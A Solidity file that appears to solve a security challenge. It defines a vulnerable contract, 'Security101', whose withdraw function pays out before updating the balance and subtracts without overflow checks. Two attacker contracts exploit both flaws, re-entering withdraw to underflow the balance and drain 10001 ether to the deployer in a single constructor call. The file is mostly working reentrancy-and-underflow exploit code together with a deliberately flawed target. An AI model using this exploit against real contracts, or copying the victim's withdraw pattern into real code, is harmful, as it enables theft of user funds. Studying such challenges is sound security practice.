// SPDX-License-Identifier: AGPL-3.0
pragma solidity ^0.8.15;

contract Security101 {
    mapping(address => uint256) balances;

    function deposit() external payable {
        balances[msg.sender] += msg.value;
    }

    function withdraw(uint256 amount) external {
        require(balances[msg.sender] >= amount, 'insufficient funds');
        (bool ok, ) = msg.sender.call{value: amount}('');
        require(ok, 'transfer failed');
        unchecked {
            balances[msg.sender] -= amount;
        }
    }
}

contract AttackerMiddle {
    Security101 token;
    bool i;
    constructor(Security101 _token) payable {
        token = _token;
    }

    function attack(address to) external {
        token.deposit{value: 1 ether}();
        token.withdraw(1 ether);
        token.withdraw(9999 ether);
        payable(to).transfer(10001 ether);
    }

    receive() external payable {
        if (i == false) {
            i = true;
            token.withdraw(1 ether);
        }
    }
}

contract OptimizedAttackerSecurity101 {
    Security101 token;
    constructor(address _token) payable {
        AttackerMiddle tmp = new AttackerMiddle{value: 1 ether}(Security101(_token));
        tmp.attack(msg.sender);
    }
}
